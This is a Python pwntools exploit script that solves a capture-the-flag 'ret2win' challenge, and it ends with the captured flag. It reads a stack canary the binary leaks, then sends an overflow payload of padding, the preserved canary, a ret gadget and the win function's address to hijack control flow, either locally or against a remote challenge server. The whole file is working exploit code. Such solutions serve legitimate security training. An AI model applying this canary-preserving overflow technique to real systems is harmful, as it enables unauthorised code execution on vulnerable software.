from pwn import *
elf = context.binary = ELF('./ret2win')

if args.REMOTE:
	p = remote("103.185.44.122", 19002)
else:
	p = elf.process()

canary_addr = int(p.recvline().decode().split(": ")[1],16)
log.info(f'Canary_addr: {hex(canary_addr)}') 
offsetEbp = 104
win_addr = elf.symbols['win']

def use_rop():
    rop = ROP(elf)
    rop.raw(b'A' * offsetEbp)
    rop.raw(p64(canary_addr))
    rop.raw(b'A' * 8)
    rop.raw(p64(rop.find_gadget(['ret'])[0]))
    rop.raw(p64(win_addr))
    p.sendline(rop.chain())

def use_normal():
    global offsetEbp
    global win_addr
    global canary_addr

    paddingEbp = b'A' * offsetEbp
    ret_gadget = 0x000000000040101a

    payload = paddingEbp
    payload += p64(canary_addr)
    payload += b'A' * 8
    payload += p64(ret_gadget)
    payload += p64(win_addr)
    p.sendline(payload)

#use_rop()
use_normal()
p.recvline()
print('Flag >> ', p.recvline().decode('utf-8'))
p.interactive()
# TCP1P{gimana_rasanya_ngebypass_mitigasi_pertama_bang}
